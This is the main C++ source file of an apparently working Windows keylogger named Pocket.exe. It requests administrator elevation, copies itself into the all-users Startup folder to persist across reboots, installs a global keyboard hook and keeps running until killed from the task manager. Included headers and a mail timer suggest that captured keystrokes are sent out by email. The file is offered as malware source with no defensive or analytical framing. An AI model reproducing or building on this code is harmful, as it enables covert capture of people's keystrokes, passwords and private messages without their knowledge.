#include <iostream>
#include <windows.h>

#include "Helper.h"
#include "Constants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeyboardHook.h"

#include <cstdio>  /* defines FILENAME_MAX */
#include <direct.h>

#include "Determination.cpp"
#include "Elevation.cpp"

bool IsRunAsAdministrator();
void ElevateNow();

using namespace std;


int main() {
    MSG msg;

    if(IsRunAsAdministrator()) {}
    else ElevateNow();

    char buff[FILENAME_MAX];
    string temp = string(_getcwd(buff, FILENAME_MAX)) + string("\\Pocket.exe");
    char * path = new char [temp.length()+1];
    strcpy (path, temp.c_str());
    const CHAR *newLocation = R"(C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Pocket.exe)";

    bool b = CopyFile(path, newLocation, 0);
    if (!b) {
        cout << "Error: " << GetLastError() << endl;
    } else {
        cout << "Okay " << endl;
    }

    IO::mkDir(IO::getPath(true));  // creates default path
    InstallHook();
    while(GetMessage (&msg, NULL, 0, 0)) {  // makes program not stop (except w task manager)
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    MailTimer.Stop();
    return 0;
}